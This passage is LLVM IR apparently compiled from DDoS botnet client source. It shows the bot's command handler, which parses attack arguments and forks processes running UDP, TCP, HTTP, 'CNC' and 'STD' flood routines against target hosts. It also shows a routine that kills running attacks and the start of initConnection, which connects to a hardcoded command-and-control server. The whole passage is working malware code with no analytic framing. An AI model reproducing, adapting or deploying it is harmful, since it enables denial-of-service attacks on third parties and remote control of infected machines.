  %137 = call i32 @strcmp(i8* %136, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.105, i32 0, i32 0)) #10
  %138 = icmp ne i32 %137, 0
  br i1 %138, label %252, label %139

; <label>:139:                                    ; preds = %133
  %140 = load i32, i32* %3, align 4
  %141 = icmp slt i32 %140, 6
  br i1 %141, label %187, label %142

; <label>:142:                                    ; preds = %139
  %143 = load i8**, i8*** %4, align 8
  %144 = getelementptr inbounds i8*, i8** %143, i64 3
  %145 = load i8*, i8** %144, align 8
  %146 = call i32 @atoi(i8* %145) #10
  %147 = icmp eq i32 %146, -1
  br i1 %147, label %187, label %148

; <label>:148:                                    ; preds = %142
  %149 = load i8**, i8*** %4, align 8
  %150 = getelementptr inbounds i8*, i8** %149, i64 2
  %151 = load i8*, i8** %150, align 8
  %152 = call i32 @atoi(i8* %151) #10
  %153 = icmp eq i32 %152, -1
  br i1 %153, label %187, label %154

; <label>:154:                                    ; preds = %148
  %155 = load i8**, i8*** %4, align 8
  %156 = getelementptr inbounds i8*, i8** %155, i64 4
  %157 = load i8*, i8** %156, align 8
  %158 = call i32 @atoi(i8* %157) #10
  %159 = icmp eq i32 %158, -1
  br i1 %159, label %187, label %160

; <label>:160:                                    ; preds = %154
  %161 = load i8**, i8*** %4, align 8
  %162 = getelementptr inbounds i8*, i8** %161, i64 5
  %163 = load i8*, i8** %162, align 8
  %164 = call i32 @atoi(i8* %163) #10
  %165 = icmp eq i32 %164, -1
  br i1 %165, label %187, label %166

; <label>:166:                                    ; preds = %160
  %167 = load i8**, i8*** %4, align 8
  %168 = getelementptr inbounds i8*, i8** %167, i64 5
  %169 = load i8*, i8** %168, align 8
  %170 = call i32 @atoi(i8* %169) #10
  %171 = icmp sgt i32 %170, 65500
  br i1 %171, label %187, label %172

; <label>:172:                                    ; preds = %166
  %173 = load i8**, i8*** %4, align 8
  %174 = getelementptr inbounds i8*, i8** %173, i64 4
  %175 = load i8*, i8** %174, align 8
  %176 = call i32 @atoi(i8* %175) #10
  %177 = icmp sgt i32 %176, 32
  br i1 %177, label %187, label %178

; <label>:178:                                    ; preds = %172
  %179 = load i32, i32* %3, align 4
  %180 = icmp eq i32 %179, 7
  br i1 %180, label %181, label %188

; <label>:181:                                    ; preds = %178
  %182 = load i8**, i8*** %4, align 8
  %183 = getelementptr inbounds i8*, i8** %182, i64 6
  %184 = load i8*, i8** %183, align 8
  %185 = call i32 @atoi(i8* %184) #10
  %186 = icmp slt i32 %185, 1
  br i1 %186, label %187, label %188

; <label>:187:                                    ; preds = %181, %172, %166, %160, %154, %148, %142, %139
  br label %622

; <label>:188:                                    ; preds = %181, %178
  %189 = load i8**, i8*** %4, align 8
  %190 = getelementptr inbounds i8*, i8** %189, i64 1
  %191 = load i8*, i8** %190, align 8
  store i8* %191, i8** %8, align 8
  %192 = load i8**, i8*** %4, align 8
  %193 = getelementptr inbounds i8*, i8** %192, i64 2
  %194 = load i8*, i8** %193, align 8
  %195 = call i32 @atoi(i8* %194) #10
  store i32 %195, i32* %9, align 4
  %196 = load i8**, i8*** %4, align 8
  %197 = getelementptr inbounds i8*, i8** %196, i64 3
  %198 = load i8*, i8** %197, align 8
  %199 = call i32 @atoi(i8* %198) #10
  store i32 %199, i32* %10, align 4
  %200 = load i8**, i8*** %4, align 8
  %201 = getelementptr inbounds i8*, i8** %200, i64 4
  %202 = load i8*, i8** %201, align 8
  %203 = call i32 @atoi(i8* %202) #10
  store i32 %203, i32* %11, align 4
  %204 = load i8**, i8*** %4, align 8
  %205 = getelementptr inbounds i8*, i8** %204, i64 5
  %206 = load i8*, i8** %205, align 8
  %207 = call i32 @atoi(i8* %206) #10
  store i32 %207, i32* %12, align 4
  %208 = load i32, i32* %3, align 4
  %209 = icmp eq i32 %208, 7
  br i1 %209, label %210, label %215

; <label>:210:                                    ; preds = %188
  %211 = load i8**, i8*** %4, align 8
  %212 = getelementptr inbounds i8*, i8** %211, i64 6
  %213 = load i8*, i8** %212, align 8
  %214 = call i32 @atoi(i8* %213) #10
  br label %216

; <label>:215:                                    ; preds = %188
  br label %216

; <label>:216:                                    ; preds = %215, %210
  %217 = phi i32 [ %214, %210 ], [ 10, %215 ]
  store i32 %217, i32* %13, align 4
  %218 = load i8*, i8** %8, align 8
  %219 = call i8* @strstr(i8* %218, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #10
  %220 = icmp ne i8* %219, null
  br i1 %220, label %221, label %240

; <label>:221:                                    ; preds = %216
  %222 = load i8*, i8** %8, align 8
  %223 = call i8* @strtok(i8* %222, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %223, i8** %14, align 8
  br label %224

; <label>:224:                                    ; preds = %237, %221
  %225 = load i8*, i8** %14, align 8
  %226 = icmp ne i8* %225, null
  br i1 %226, label %227, label %239

; <label>:227:                                    ; preds = %224
  %228 = call i32 @listFork()
  %229 = icmp ne i32 %228, 0
  br i1 %229, label %237, label %230

; <label>:230:                                    ; preds = %227
  %231 = load i8*, i8** %14, align 8
  %232 = load i32, i32* %9, align 4
  %233 = load i32, i32* %10, align 4
  %234 = load i32, i32* %11, align 4
  %235 = load i32, i32* %12, align 4
  %236 = load i32, i32* %13, align 4
  call void @sendUDP(i8* %231, i32 %232, i32 %233, i32 %234, i32 %235, i32 %236)
  call void @_exit(i32 0) #12
  unreachable

; <label>:237:                                    ; preds = %227
  %238 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %238, i8** %14, align 8
  br label %224

; <label>:239:                                    ; preds = %224
  br label %251

; <label>:240:                                    ; preds = %216
  %241 = call i32 @listFork()
  %242 = icmp ne i32 %241, 0
  br i1 %242, label %243, label %244

; <label>:243:                                    ; preds = %240
  br label %622

; <label>:244:                                    ; preds = %240
  %245 = load i8*, i8** %8, align 8
  %246 = load i32, i32* %9, align 4
  %247 = load i32, i32* %10, align 4
  %248 = load i32, i32* %11, align 4
  %249 = load i32, i32* %12, align 4
  %250 = load i32, i32* %13, align 4
  call void @sendUDP(i8* %245, i32 %246, i32 %247, i32 %248, i32 %249, i32 %250)
  call void @_exit(i32 0) #12
  unreachable

; <label>:251:                                    ; preds = %239
  br label %252

; <label>:252:                                    ; preds = %251, %133
  %253 = load i8**, i8*** %4, align 8
  %254 = getelementptr inbounds i8*, i8** %253, i64 0
  %255 = load i8*, i8** %254, align 8
  %256 = call i32 @strcmp(i8* %255, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.106, i32 0, i32 0)) #10
  %257 = icmp ne i32 %256, 0
  br i1 %257, label %379, label %258

; <label>:258:                                    ; preds = %252
  %259 = load i32, i32* %3, align 4
  %260 = icmp slt i32 %259, 6
  br i1 %260, label %303, label %261

; <label>:261:                                    ; preds = %258
  %262 = load i8**, i8*** %4, align 8
  %263 = getelementptr inbounds i8*, i8** %262, i64 3
  %264 = load i8*, i8** %263, align 8
  %265 = call i32 @atoi(i8* %264) #10
  %266 = icmp eq i32 %265, -1
  br i1 %266, label %303, label %267

; <label>:267:                                    ; preds = %261
  %268 = load i8**, i8*** %4, align 8
  %269 = getelementptr inbounds i8*, i8** %268, i64 2
  %270 = load i8*, i8** %269, align 8
  %271 = call i32 @atoi(i8* %270) #10
  %272 = icmp eq i32 %271, -1
  br i1 %272, label %303, label %273

; <label>:273:                                    ; preds = %267
  %274 = load i8**, i8*** %4, align 8
  %275 = getelementptr inbounds i8*, i8** %274, i64 4
  %276 = load i8*, i8** %275, align 8
  %277 = call i32 @atoi(i8* %276) #10
  %278 = icmp eq i32 %277, -1
  br i1 %278, label %303, label %279

; <label>:279:                                    ; preds = %273
  %280 = load i8**, i8*** %4, align 8
  %281 = getelementptr inbounds i8*, i8** %280, i64 4
  %282 = load i8*, i8** %281, align 8
  %283 = call i32 @atoi(i8* %282) #10
  %284 = icmp sgt i32 %283, 32
  br i1 %284, label %303, label %285

; <label>:285:                                    ; preds = %279
  %286 = load i32, i32* %3, align 4
  %287 = icmp sgt i32 %286, 6
  br i1 %287, label %288, label %294

; <label>:288:                                    ; preds = %285
  %289 = load i8**, i8*** %4, align 8
  %290 = getelementptr inbounds i8*, i8** %289, i64 6
  %291 = load i8*, i8** %290, align 8
  %292 = call i32 @atoi(i8* %291) #10
  %293 = icmp slt i32 %292, 0
  br i1 %293, label %303, label %294

; <label>:294:                                    ; preds = %288, %285
  %295 = load i32, i32* %3, align 4
  %296 = icmp eq i32 %295, 8
  br i1 %296, label %297, label %304

; <label>:297:                                    ; preds = %294
  %298 = load i8**, i8*** %4, align 8
  %299 = getelementptr inbounds i8*, i8** %298, i64 7
  %300 = load i8*, i8** %299, align 8
  %301 = call i32 @atoi(i8* %300) #10
  %302 = icmp slt i32 %301, 1
  br i1 %302, label %303, label %304

; <label>:303:                                    ; preds = %297, %288, %279, %273, %267, %261, %258
  br label %622

; <label>:304:                                    ; preds = %297, %294
  %305 = load i8**, i8*** %4, align 8
  %306 = getelementptr inbounds i8*, i8** %305, i64 1
  %307 = load i8*, i8** %306, align 8
  store i8* %307, i8** %15, align 8
  %308 = load i8**, i8*** %4, align 8
  %309 = getelementptr inbounds i8*, i8** %308, i64 2
  %310 = load i8*, i8** %309, align 8
  %311 = call i32 @atoi(i8* %310) #10
  store i32 %311, i32* %16, align 4
  %312 = load i8**, i8*** %4, align 8
  %313 = getelementptr inbounds i8*, i8** %312, i64 3
  %314 = load i8*, i8** %313, align 8
  %315 = call i32 @atoi(i8* %314) #10
  store i32 %315, i32* %17, align 4
  %316 = load i8**, i8*** %4, align 8
  %317 = getelementptr inbounds i8*, i8** %316, i64 4
  %318 = load i8*, i8** %317, align 8
  %319 = call i32 @atoi(i8* %318) #10
  store i32 %319, i32* %18, align 4
  %320 = load i8**, i8*** %4, align 8
  %321 = getelementptr inbounds i8*, i8** %320, i64 5
  %322 = load i8*, i8** %321, align 8
  store i8* %322, i8** %19, align 8
  %323 = load i32, i32* %3, align 4
  %324 = icmp eq i32 %323, 8
  br i1 %324, label %325, label %330

; <label>:325:                                    ; preds = %304
  %326 = load i8**, i8*** %4, align 8
  %327 = getelementptr inbounds i8*, i8** %326, i64 7
  %328 = load i8*, i8** %327, align 8
  %329 = call i32 @atoi(i8* %328) #10
  br label %331

; <label>:330:                                    ; preds = %304
  br label %331

; <label>:331:                                    ; preds = %330, %325
  %332 = phi i32 [ %329, %325 ], [ 10, %330 ]
  store i32 %332, i32* %20, align 4
  %333 = load i32, i32* %3, align 4
  %334 = icmp sgt i32 %333, 6
  br i1 %334, label %335, label %340

; <label>:335:                                    ; preds = %331
  %336 = load i8**, i8*** %4, align 8
  %337 = getelementptr inbounds i8*, i8** %336, i64 6
  %338 = load i8*, i8** %337, align 8
  %339 = call i32 @atoi(i8* %338) #10
  br label %341

; <label>:340:                                    ; preds = %331
  br label %341

; <label>:341:                                    ; preds = %340, %335
  %342 = phi i32 [ %339, %335 ], [ 0, %340 ]
  store i32 %342, i32* %21, align 4
  %343 = load i8*, i8** %15, align 8
  %344 = call i8* @strstr(i8* %343, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #10
  %345 = icmp ne i8* %344, null
  br i1 %345, label %346, label %366

; <label>:346:                                    ; preds = %341
  %347 = load i8*, i8** %15, align 8
  %348 = call i8* @strtok(i8* %347, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %348, i8** %22, align 8
  br label %349

; <label>:349:                                    ; preds = %363, %346
  %350 = load i8*, i8** %22, align 8
  %351 = icmp ne i8* %350, null
  br i1 %351, label %352, label %365

; <label>:352:                                    ; preds = %349
  %353 = call i32 @listFork()
  %354 = icmp ne i32 %353, 0
  br i1 %354, label %363, label %355

; <label>:355:                                    ; preds = %352
  %356 = load i8*, i8** %22, align 8
  %357 = load i32, i32* %16, align 4
  %358 = load i32, i32* %17, align 4
  %359 = load i32, i32* %18, align 4
  %360 = load i8*, i8** %19, align 8
  %361 = load i32, i32* %21, align 4
  %362 = load i32, i32* %20, align 4
  call void @sendTCP(i8* %356, i32 %357, i32 %358, i32 %359, i8* %360, i32 %361, i32 %362)
  call void @_exit(i32 0) #12
  unreachable

; <label>:363:                                    ; preds = %352
  %364 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %364, i8** %22, align 8
  br label %349

; <label>:365:                                    ; preds = %349
  br label %378

; <label>:366:                                    ; preds = %341
  %367 = call i32 @listFork()
  %368 = icmp ne i32 %367, 0
  br i1 %368, label %369, label %370

; <label>:369:                                    ; preds = %366
  br label %622

; <label>:370:                                    ; preds = %366
  %371 = load i8*, i8** %15, align 8
  %372 = load i32, i32* %16, align 4
  %373 = load i32, i32* %17, align 4
  %374 = load i32, i32* %18, align 4
  %375 = load i8*, i8** %19, align 8
  %376 = load i32, i32* %21, align 4
  %377 = load i32, i32* %20, align 4
  call void @sendTCP(i8* %371, i32 %372, i32 %373, i32 %374, i8* %375, i32 %376, i32 %377)
  call void @_exit(i32 0) #12
  unreachable

; <label>:378:                                    ; preds = %365
  br label %379

; <label>:379:                                    ; preds = %378, %252
  %380 = load i8**, i8*** %4, align 8
  %381 = getelementptr inbounds i8*, i8** %380, i64 0
  %382 = load i8*, i8** %381, align 8
  %383 = call i32 @strcmp(i8* %382, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.107, i32 0, i32 0)) #10
  %384 = icmp ne i32 %383, 0
  br i1 %384, label %447, label %385

; <label>:385:                                    ; preds = %379
  %386 = load i32, i32* %3, align 4
  %387 = icmp slt i32 %386, 3
  br i1 %387, label %394, label %388

; <label>:388:                                    ; preds = %385
  %389 = load i8**, i8*** %4, align 8
  %390 = getelementptr inbounds i8*, i8** %389, i64 2
  %391 = load i8*, i8** %390, align 8
  %392 = call i32 @atoi(i8* %391) #10
  %393 = icmp slt i32 %392, 1
  br i1 %393, label %394, label %395

; <label>:394:                                    ; preds = %388, %385
  br label %622

; <label>:395:                                    ; preds = %388
  %396 = load i8**, i8*** %4, align 8
  %397 = getelementptr inbounds i8*, i8** %396, i64 1
  %398 = load i8*, i8** %397, align 8
  store i8* %398, i8** %23, align 8
  %399 = load i8**, i8*** %4, align 8
  %400 = getelementptr inbounds i8*, i8** %399, i64 2
  %401 = load i8*, i8** %400, align 8
  %402 = call i32 @atoi(i8* %401) #10
  store i32 %402, i32* %24, align 4
  %403 = load i8*, i8** %23, align 8
  %404 = call i8* @strstr(i8* %403, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #10
  %405 = icmp ne i8* %404, null
  br i1 %405, label %406, label %430

; <label>:406:                                    ; preds = %395
  %407 = load i8*, i8** %23, align 8
  %408 = call i8* @strtok(i8* %407, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %408, i8** %25, align 8
  br label %409

; <label>:409:                                    ; preds = %427, %406
  %410 = load i8*, i8** %25, align 8
  %411 = icmp ne i8* %410, null
  br i1 %411, label %412, label %429

; <label>:412:                                    ; preds = %409
  %413 = call i32 @listFork()
  %414 = icmp ne i32 %413, 0
  br i1 %414, label %427, label %415

; <label>:415:                                    ; preds = %412
  store i32 0, i32* %26, align 4
  br label %416

; <label>:416:                                    ; preds = %419, %415
  %417 = load i32, i32* %26, align 4
  %418 = icmp slt i32 %417, 10
  br i1 %418, label %419, label %424

; <label>:419:                                    ; preds = %416
  %420 = load i8*, i8** %23, align 8
  %421 = load i32, i32* %24, align 4
  call void @sendHTTP(i8* %420, i32 %421)
  %422 = load i32, i32* %26, align 4
  %423 = add nsw i32 %422, 1
  store i32 %423, i32* %26, align 4
  br label %416

; <label>:424:                                    ; preds = %416
  %425 = load i32, i32* @mainCommSock, align 4
  %426 = call i32 @close(i32 %425)
  call void @_exit(i32 0) #12
  unreachable

; <label>:427:                                    ; preds = %412
  %428 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %428, i8** %25, align 8
  br label %409

; <label>:429:                                    ; preds = %409
  br label %446

; <label>:430:                                    ; preds = %395
  %431 = call i32 @listFork()
  %432 = icmp ne i32 %431, 0
  br i1 %432, label %433, label %434

; <label>:433:                                    ; preds = %430
  br label %622

; <label>:434:                                    ; preds = %430
  store i32 0, i32* %27, align 4
  br label %435

; <label>:435:                                    ; preds = %438, %434
  %436 = load i32, i32* %27, align 4
  %437 = icmp slt i32 %436, 10
  br i1 %437, label %438, label %443

; <label>:438:                                    ; preds = %435
  %439 = load i8*, i8** %23, align 8
  %440 = load i32, i32* %24, align 4
  call void @sendHTTP(i8* %439, i32 %440)
  %441 = load i32, i32* %27, align 4
  %442 = add nsw i32 %441, 1
  store i32 %442, i32* %27, align 4
  br label %435

; <label>:443:                                    ; preds = %435
  %444 = load i32, i32* @mainCommSock, align 4
  %445 = call i32 @close(i32 %444)
  call void @_exit(i32 0) #12
  unreachable

; <label>:446:                                    ; preds = %429
  br label %447

; <label>:447:                                    ; preds = %446, %379
  %448 = load i8**, i8*** %4, align 8
  %449 = getelementptr inbounds i8*, i8** %448, i64 0
  %450 = load i8*, i8** %449, align 8
  %451 = call i32 @strcmp(i8* %450, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i32 0, i32 0)) #10
  %452 = icmp ne i32 %451, 0
  br i1 %452, label %511, label %453

; <label>:453:                                    ; preds = %447
  %454 = load i32, i32* %3, align 4
  %455 = icmp slt i32 %454, 4
  br i1 %455, label %468, label %456

; <label>:456:                                    ; preds = %453
  %457 = load i8**, i8*** %4, align 8
  %458 = getelementptr inbounds i8*, i8** %457, i64 2
  %459 = load i8*, i8** %458, align 8
  %460 = call i32 @atoi(i8* %459) #10
  %461 = icmp slt i32 %460, 1
  br i1 %461, label %468, label %462

; <label>:462:                                    ; preds = %456
  %463 = load i8**, i8*** %4, align 8
  %464 = getelementptr inbounds i8*, i8** %463, i64 3
  %465 = load i8*, i8** %464, align 8
  %466 = call i32 @atoi(i8* %465) #10
  %467 = icmp slt i32 %466, 1
  br i1 %467, label %468, label %469

; <label>:468:                                    ; preds = %462, %456, %453
  br label %622

; <label>:469:                                    ; preds = %462
  %470 = load i8**, i8*** %4, align 8
  %471 = getelementptr inbounds i8*, i8** %470, i64 1
  %472 = load i8*, i8** %471, align 8
  store i8* %472, i8** %28, align 8
  %473 = load i8**, i8*** %4, align 8
  %474 = getelementptr inbounds i8*, i8** %473, i64 2
  %475 = load i8*, i8** %474, align 8
  %476 = call i32 @atoi(i8* %475) #10
  store i32 %476, i32* %29, align 4
  %477 = load i8**, i8*** %4, align 8
  %478 = getelementptr inbounds i8*, i8** %477, i64 3
  %479 = load i8*, i8** %478, align 8
  %480 = call i32 @atoi(i8* %479) #10
  store i32 %480, i32* %30, align 4
  %481 = load i8*, i8** %28, align 8
  %482 = call i8* @strstr(i8* %481, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #10
  %483 = icmp ne i8* %482, null
  br i1 %483, label %484, label %502

; <label>:484:                                    ; preds = %469
  %485 = load i8*, i8** %28, align 8
  %486 = call i8* @strtok(i8* %485, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %486, i8** %31, align 8
  br label %487

; <label>:487:                                    ; preds = %499, %484
  %488 = load i8*, i8** %31, align 8
  %489 = icmp ne i8* %488, null
  br i1 %489, label %490, label %501

; <label>:490:                                    ; preds = %487
  %491 = call i32 @listFork()
  %492 = icmp ne i32 %491, 0
  br i1 %492, label %499, label %493

; <label>:493:                                    ; preds = %490
  %494 = load i8*, i8** %31, align 8
  %495 = load i32, i32* %29, align 4
  %496 = load i32, i32* %30, align 4
  call void @sendCNC(i8* %494, i32 %495, i32 %496)
  %497 = load i32, i32* @mainCommSock, align 4
  %498 = call i32 @close(i32 %497)
  call void @_exit(i32 0) #12
  unreachable

; <label>:499:                                    ; preds = %490
  %500 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %500, i8** %31, align 8
  br label %487

; <label>:501:                                    ; preds = %487
  br label %510

; <label>:502:                                    ; preds = %469
  %503 = call i32 @listFork()
  %504 = icmp ne i32 %503, 0
  br i1 %504, label %505, label %506

; <label>:505:                                    ; preds = %502
  br label %622

; <label>:506:                                    ; preds = %502
  %507 = load i8*, i8** %28, align 8
  %508 = load i32, i32* %29, align 4
  %509 = load i32, i32* %30, align 4
  call void @sendCNC(i8* %507, i32 %508, i32 %509)
  call void @_exit(i32 0) #12
  unreachable

; <label>:510:                                    ; preds = %501
  br label %511

; <label>:511:                                    ; preds = %510, %447
  %512 = load i8**, i8*** %4, align 8
  %513 = getelementptr inbounds i8*, i8** %512, i64 0
  %514 = load i8*, i8** %513, align 8
  %515 = call i32 @strcmp(i8* %514, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.109, i32 0, i32 0)) #10
  %516 = icmp ne i32 %515, 0
  br i1 %516, label %573, label %517

; <label>:517:                                    ; preds = %511
  %518 = load i32, i32* %3, align 4
  %519 = icmp slt i32 %518, 4
  br i1 %519, label %532, label %520

; <label>:520:                                    ; preds = %517
  %521 = load i8**, i8*** %4, align 8
  %522 = getelementptr inbounds i8*, i8** %521, i64 2
  %523 = load i8*, i8** %522, align 8
  %524 = call i32 @atoi(i8* %523) #10
  %525 = icmp slt i32 %524, 1
  br i1 %525, label %532, label %526

; <label>:526:                                    ; preds = %520
  %527 = load i8**, i8*** %4, align 8
  %528 = getelementptr inbounds i8*, i8** %527, i64 3
  %529 = load i8*, i8** %528, align 8
  %530 = call i32 @atoi(i8* %529) #10
  %531 = icmp slt i32 %530, 1
  br i1 %531, label %532, label %533

; <label>:532:                                    ; preds = %526, %520, %517
  br label %622

; <label>:533:                                    ; preds = %526
  %534 = load i8**, i8*** %4, align 8
  %535 = getelementptr inbounds i8*, i8** %534, i64 1
  %536 = load i8*, i8** %535, align 8
  store i8* %536, i8** %32, align 8
  %537 = load i8**, i8*** %4, align 8
  %538 = getelementptr inbounds i8*, i8** %537, i64 2
  %539 = load i8*, i8** %538, align 8
  %540 = call i32 @atoi(i8* %539) #10
  store i32 %540, i32* %33, align 4
  %541 = load i8**, i8*** %4, align 8
  %542 = getelementptr inbounds i8*, i8** %541, i64 3
  %543 = load i8*, i8** %542, align 8
  %544 = call i32 @atoi(i8* %543) #10
  store i32 %544, i32* %34, align 4
  %545 = load i8*, i8** %32, align 8
  %546 = call i8* @strstr(i8* %545, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #10
  %547 = icmp ne i8* %546, null
  br i1 %547, label %548, label %564

; <label>:548:                                    ; preds = %533
  %549 = load i8*, i8** %32, align 8
  %550 = call i8* @strtok(i8* %549, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %550, i8** %35, align 8
  br label %551

; <label>:551:                                    ; preds = %561, %548
  %552 = load i8*, i8** %35, align 8
  %553 = icmp ne i8* %552, null
  br i1 %553, label %554, label %563

; <label>:554:                                    ; preds = %551
  %555 = call i32 @listFork()
  %556 = icmp ne i32 %555, 0
  br i1 %556, label %561, label %557

; <label>:557:                                    ; preds = %554
  %558 = load i8*, i8** %35, align 8
  %559 = load i32, i32* %33, align 4
  %560 = load i32, i32* %34, align 4
  call void @sendSTD(i8* %558, i32 %559, i32 %560)
  call void @_exit(i32 0) #12
  unreachable

; <label>:561:                                    ; preds = %554
  %562 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %562, i8** %35, align 8
  br label %551

; <label>:563:                                    ; preds = %551
  br label %572

; <label>:564:                                    ; preds = %533
  %565 = call i32 @listFork()
  %566 = icmp ne i32 %565, 0
  br i1 %566, label %567, label %568

; <label>:567:                                    ; preds = %564
  br label %622

; <label>:568:                                    ; preds = %564
  %569 = load i8*, i8** %32, align 8
  %570 = load i32, i32* %33, align 4
  %571 = load i32, i32* %34, align 4
  call void @sendSTD(i8* %569, i32 %570, i32 %571)
  call void @_exit(i32 0) #12
  unreachable

; <label>:572:                                    ; preds = %563
  br label %573

; <label>:573:                                    ; preds = %572, %511
  %574 = load i8**, i8*** %4, align 8
  %575 = getelementptr inbounds i8*, i8** %574, i64 0
  %576 = load i8*, i8** %575, align 8
  %577 = call i32 @strcmp(i8* %576, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.110, i32 0, i32 0)) #10
  %578 = icmp ne i32 %577, 0
  br i1 %578, label %615, label %579

; <label>:579:                                    ; preds = %573
  store i32 0, i32* %36, align 4
  store i64 0, i64* %37, align 8
  br label %580

; <label>:580:                                    ; preds = %606, %579
  %581 = load i64, i64* %37, align 8
  %582 = load i64, i64* @numpids, align 8
  %583 = icmp ult i64 %581, %582
  br i1 %583, label %584, label %609

; <label>:584:                                    ; preds = %580
  %585 = load i32*, i32** @pids, align 8
  %586 = load i64, i64* %37, align 8
  %587 = getelementptr inbounds i32, i32* %585, i64 %586
  %588 = load i32, i32* %587, align 4
  %589 = icmp ne i32 %588, 0
  br i1 %589, label %590, label %605

; <label>:590:                                    ; preds = %584
  %591 = load i32*, i32** @pids, align 8
  %592 = load i64, i64* %37, align 8
  %593 = getelementptr inbounds i32, i32* %591, i64 %592
  %594 = load i32, i32* %593, align 4
  %595 = call i32 @getpid() #2
  %596 = icmp ne i32 %594, %595
  br i1 %596, label %597, label %605

; <label>:597:                                    ; preds = %590
  %598 = load i32*, i32** @pids, align 8
  %599 = load i64, i64* %37, align 8
  %600 = getelementptr inbounds i32, i32* %598, i64 %599
  %601 = load i32, i32* %600, align 4
  %602 = call i32 @kill(i32 %601, i32 9) #2
  %603 = load i32, i32* %36, align 4
  %604 = add nsw i32 %603, 1
  store i32 %604, i32* %36, align 4
  br label %605

; <label>:605:                                    ; preds = %597, %590, %584
  br label %606

; <label>:606:                                    ; preds = %605
  %607 = load i64, i64* %37, align 8
  %608 = add i64 %607, 1
  store i64 %608, i64* %37, align 8
  br label %580

; <label>:609:                                    ; preds = %580
  %610 = load i32, i32* %36, align 4
  %611 = icmp sgt i32 %610, 0
  br i1 %611, label %612, label %613

; <label>:612:                                    ; preds = %609
  br label %614

; <label>:613:                                    ; preds = %609
  br label %614

; <label>:614:                                    ; preds = %613, %612
  br label %615

; <label>:615:                                    ; preds = %614, %573
  %616 = load i8**, i8*** %4, align 8
  %617 = getelementptr inbounds i8*, i8** %616, i64 0
  %618 = load i8*, i8** %617, align 8
  %619 = call i32 @strcmp(i8* %618, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.111, i32 0, i32 0)) #10
  %620 = icmp ne i32 %619, 0
  br i1 %620, label %622, label %621

; <label>:621:                                    ; preds = %615
  call void @exit(i32 0) #14
  unreachable

; <label>:622:                                    ; preds = %615, %567, %532, %505, %468, %433, %394, %369, %303, %243, %187, %128, %123, %116, %104, %99, %92, %78, %66, %52, %43
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %19

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* @currentServer, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* @currentServer, align 4
  br label %19

; <label>:19:                                     ; preds = %16, %15
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %21 = load i32, i32* @currentServer, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %22
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @strcpy(i8* %20, i8* %24) #2
  store i32 443, i32* %3, align 4
  %26 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %27 = call i8* @strchr(i8* %26, i32 58) #10
  %28 = icmp ne i8* %27, null
  br i1 %28, label %29, label %36

; <label>:29:                                     ; preds = %19
  %30 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %31 = call i8* @strchr(i8* %30, i32 58) #10
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = call i32 @atoi(i8* %32) #10
  store i32 %33, i32* %3, align 4
  %34 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %35 = call i8* @strchr(i8* %34, i32 58) #10
  store i8 0, i8* %35, align 1
  br label %36

